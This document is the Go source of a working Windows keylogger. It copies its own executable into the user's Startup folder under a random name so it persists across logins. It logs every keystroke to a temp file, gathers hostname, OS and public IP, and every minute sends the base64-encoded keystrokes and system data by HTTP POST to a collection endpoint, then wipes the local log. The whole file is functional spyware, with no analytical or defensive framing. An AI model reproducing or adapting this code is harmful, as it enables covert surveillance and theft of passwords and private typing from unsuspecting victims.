package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"log"
	"math/big"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"runtime"
	"sync"
	"time"

	"github.com/BKasin/go-keylogger"
	"github.com/eiannone/keyboard"
	"github.com/robfig/cron/v3"
)

var (
	userDirectory, _  = os.UserHomeDir()
	userTempDirectory = os.TempDir()
	userArchi         = runtime.GOARCH
	userOs            = string(runtime.GOOS)
	hostname, _       = os.Hostname()
)
var infoBytes int

type KeyLog struct {
	Body string
	Info string
}

var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")

// var addStartUp = string(userDirectory + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start-up\\" + randSeq(5) + ".exe")
var addStartUp = filepath.Join(userDirectory, "AppData", "Roaming", "Microsoft", "Windows", "Start Menu", "Programs", "Startup", randSeq(5)+".exe")

var logFileName = string(userTempDirectory + "\\log.txt")
var sysinfoFileName = string(userTempDirectory + "\\sysinfo.txt")

// var logFileName = "log.txt"
// var sysinfoFileName = "sysinfo.txt"
func main() {
	var wg sync.WaitGroup
	wg.Add(2)

	copyToStart()
	checkLogFileStatus()
	go getKeyLogStarted(&wg)
	go setCronJob(&wg)
	wg.Wait()

}

// Init Crob Job
func setCronJob(wg *sync.WaitGroup) {
	defer wg.Done()
	// Create a new cron job that runs sendData() every minute
	c := cron.New()
	c.AddFunc("*/1 * * * *", func() {
		sendData()
	})
	c.Start()

	// Wait forever
	select {}
}

// Get LogStarted
func getKeyLogStarted(wg *sync.WaitGroup) {
	defer wg.Done()
	kl := keylogger.NewKeylogger()
	file, err := os.OpenFile(
		logFileName,
		os.O_APPEND|os.O_CREATE|os.O_WRONLY,
		0666,
	)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	for {
		key := kl.GetKey()
		if !key.Empty {

			var byting []byte
			if key.Keycode == int(keyboard.KeyEnter) {
				byting = []byte(" ENTER_KEY ")
			} else if key.Keycode == int(keyboard.KeySpace) {
				byting = []byte(" SPACE_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowDown) {
				byting = []byte(" ARROW_DOWN_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowUp) {
				byting = []byte(" ARROW_UP_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowLeft) {
				byting = []byte(" ARROW_LEFT_KEY ")
			} else if key.Keycode == int(keyboard.KeyArrowRight) {
				byting = []byte(" ARROW_RIGHT_KEY ")
			} else if key.Keycode == int(keyboard.KeyEsc) {
				byting = []byte(" ESC_KEY ")
			} else if key.Keycode == int(keyboard.KeyBackspace) {
				byting = []byte(" BACKSPACE_KEY ")
			} else if key.Keycode == int(keyboard.KeyDelete) {
				byting = []byte(" DELETE_KEY ")
			} else if key.Keycode == int(keyboard.KeyCtrlN) {
				byting = []byte(" CTRL_N_KEY ")
			} else if key.Keycode == int(keyboard.KeyCtrlC) {
				byting = []byte(" CTRL_C_KEY ")
			} else if key.Keycode == int(keyboard.KeyCtrlZ) {
				byting = []byte(" CTRL_Z_KEY ")
			} else {
				byting = big.NewInt(int64(key.Rune)).Bytes()
			}

			byteSlice := (byting)
			bytesWritten, err := file.Write(byteSlice)
			if err != nil {
				log.Fatal(err)
			}
			log.Printf("Wrote %d bytes.\n", bytesWritten)
			fmt.Printf("%c %d  \n", key.Rune, key.Keycode)
		}
		time.Sleep(time.Microsecond / 2)
	}
}

// Check If File Exists Or Not
func checkLogFileStatus() {

	fileInfo, err := os.Stat(logFileName)
	if err != nil {
		log.Println(err)
	}
	if os.IsNotExist(err) {
		newFile, err := os.Create(logFileName)
		if err != nil {
			log.Println(err)
		}
		log.Println(newFile.Name())
		writeSysInfo()
	} else {
		log.Println(fileInfo.Name())
	}
}

// Fetch System Information
func writeSysInfo() {
	//Open a new file for writing only
	file, err := os.OpenFile(
		sysinfoFileName,
		// os.O_WRONLY|os.O_TRUNC|os.O_CREATE,
		os.O_RDWR|os.O_CREATE|os.O_WRONLY,
		0666,
	)
	if err != nil {
		log.Println(err)
	}
	defer file.Close()
	res, _ := http.Get("https://api.ipify.org")
	ip, _ := io.ReadAll(res.Body)
	sysInfo := ("Operating System:	" + userOs + "\nHostname:	" + hostname + "\nPublic Ip:	" + string(ip) + "\nArchitecture:	" + userArchi + "\nUser Home Directory:	" + userDirectory + "\nUser Temp Directory:	" + userTempDirectory + "\n------------------------------------\nKEYS\n------------------------------------\n")
	byteSlice := []byte(sysInfo)
	bytesWritten, err := file.Write(byteSlice)
	if err != nil {
		log.Println(err)
	}
	infoBytes = bytesWritten
	log.Printf("Wrote info %d bytes.\n", infoBytes)
}

// send Data with cron job
func sendData() {
	data, _ := os.ReadFile(logFileName)
	info, _ := os.ReadFile(sysinfoFileName)

	//fmt.Printf("Data as hex: %x\n", data)
	if len(data) > 0 {
		fmt.Println("Number of bytes read:", len(data))
		str := base64.StdEncoding.EncodeToString(data)
		strInfo := base64.StdEncoding.EncodeToString(info)
		body := KeyLog{string(str), string(strInfo)}

		bodyEnc, _ := json.Marshal(body)

		// Create a new request with the data
		req, err := http.NewRequest("POST", "http://localhost:3000/getkeyloggerdata/", bytes.NewBuffer(bodyEnc))
		if err != nil {
			fmt.Println("Error creating request:", err)
			return
		}
		// Set headers if necessary
		req.Header.Set("Content-Type", "application/json")
		// Make the request
		client := &http.Client{}
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("Error sending data:", err)
			return
		}
		defer resp.Body.Close()
		// Check the response status code
		if resp.StatusCode != http.StatusOK {
			fmt.Println("Unexpected status code:", resp.StatusCode)
			return
		} else {
			fmt.Println("Data sent successfully!", http.StatusOK)
			file, _ := os.OpenFile(
				logFileName,
				os.O_TRUNC|os.O_CREATE,
				0666,
			)
			file.WriteString("")
			if err != nil {
				log.Fatal(err)
			}
			defer file.Close()
			// fmt.Println("Cleared File", byteEmpty)
			// fmt.Println("Cleared File 1", bytesWritten)

			return
		}
	}
}

// StartUP
func copyToStart() {
	path1, err := os.Executable()
	if err != nil {
		log.Println(err)
	}
	fmt.Println(path1)
	fmt.Println(addStartUp)
	// e1 := os.Rename(path1, midPath)
	// if e1 != nil {
	// 	fmt.Println("hello:", e1)
	// } else {
	// 	e := os.Rename(midPath, addStartUp)
	// 	if e != nil {
	// 		fmt.Println(e)
	// 	}
	// }
	// read original file
	origFile, _ := os.ReadFile(path1)
	// create new file with a different name
	newFile, _ := os.Create(addStartUp)
	// print data from original file to new file.
	fmt.Fprintf(newFile, "%s", string(origFile))
}

func randSeq(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letters[rand.Intn(len(letters))]
	}
	return string(b)
}
